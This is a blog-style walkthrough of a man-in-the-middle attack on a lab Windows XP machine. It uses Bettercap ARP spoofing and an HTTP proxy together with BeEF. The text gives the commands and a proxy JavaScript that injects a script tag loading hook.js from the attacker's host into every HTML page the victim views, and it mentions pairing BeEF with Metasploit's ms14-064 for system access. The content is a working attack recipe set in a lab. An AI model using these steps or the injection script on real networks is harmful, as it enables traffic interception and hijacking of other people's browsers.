# LAN Penetration Testing with Beef, Bettercap, and Other Tools


<!--more-->
## Introduction

Well... Let's start with some rambling as usual...

Today, I tried using Beef and Bettercap together and found them to be quite effective~

Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~

Without further ado, let's get started~

### Testing Environment

First, let's talk about the testing environment.

* Attacker machine
    * Arch Linux
    * 192.168.101.15

* Target machine
    * Windows XP on VirtualBox
    * 192.168.101.43

Due to limited resources, we can only use Windows XP for this demonstration~

### Tools Used

1. Bettercap
    * First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks...
2. Beef
    * Used for browser hijacking... and it can do many things, but I don't know the specifics.
3. Metasploit (msf)
    * Our old friend~

## Testing Process

First, let's open `bettercap`.

```bash
$ sudo bettercap
```

Then we will see the following output..

![](/img/2021-02-02_14-18.png)


**Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don't use sudo, you will see a prompt like this.**


![](/img/2021-02-02_14-20.png)

Next, set the target for ARP spoofing:

```txt
set arp.spoof.targets 192.168.101.43
```

**Here, the targets are set to the IP address of the target machine.**

Next, start Beef, and remember to use `sudo` as mentioned earlier.

```bash
$ sudo beef
```

The output should be like this:

![](/img/2021-02-02_14-28.png)

Now, let's talk about the links displayed in the terminal:

* Hook URL:  [http://192.168.101.15:3000/hook.js](http://192.168.101.15:3000/hook.js)
    * This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~
        Later, we will write it into an attack script~
* UI URL: [http://192.168.101.15:3000/ui/panel](http://192.168.101.15:3000/ui/panel)
    * This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this.

![](/img/Screenshot_2021-02-02_BeEF_Control_Panel.png)

About the username and password, here's the thing: In some systems, you can't use the default login credentials `(beef:beef)` for Beef, and it may not even start. For example, this is the case with my Arch Linux.

```txt
[14:40:25][!] ERROR: Default username and password in use!
[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
```

In such cases, what you need to do is modify the `config.yaml` file. In my case, the file is located at `/usr/share/beef/config.yaml`.

Modify it as follows:

```yaml
beef:
    version: '0.5.0.0-alpha-pre'
    # More verbose messages (server-side)
    debug: false
    # More verbose messages (client-side)
    client_debug: false
    # Used for generating secure tokens
    crypto_default_value_length: 80

    # Credentials to authenticate in BeEF.
    # Used by both the RESTful API and the Admin interface
    credentials:
        user:   "Choose a username"
        passwd: "Think of a password"
```

After that, you can start the system, and the username and password you set will be used for login.

Alright, without further ado, let's continue.

Next, we need to write a JavaScript script to use with Bettercap.

```js
function onResponse(req,res){
    if(res.ContentType.indexOf('text/html')==0){
        var body=res.ReadBody();
        if(body.indexOf('</head>')!=-1){
            res.Body=body.replace(
                '</head>',
               '<script type="text/javascript" src="http://192.168.101.15:3000/hook.js"></script></head>'
            );
            }
        }
}
```

Save this file to a directory of your choice. I will save it to `/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js`.

Then, let's go back to Bettercap and set the `http.proxy.script` parameter to the path mentioned above:

```txt
set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
```

Then start `net.probe`, `arp.spoof`, and `http.proxy` in sequence.

```txt
net.probe on
```

```txt
arp.spoof on
```

```txt
http.proxy on
```

Alright... Now everything is set up and ready to go...

![](/img/2021-02-02_15-12.png)

Then we'll have the target machine open a browser and visit a website...

Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.

![](/img/VirtualBox_XP_02_02_2021_15_25_46.png)

![](/img/2021-02-02_15-25.png)


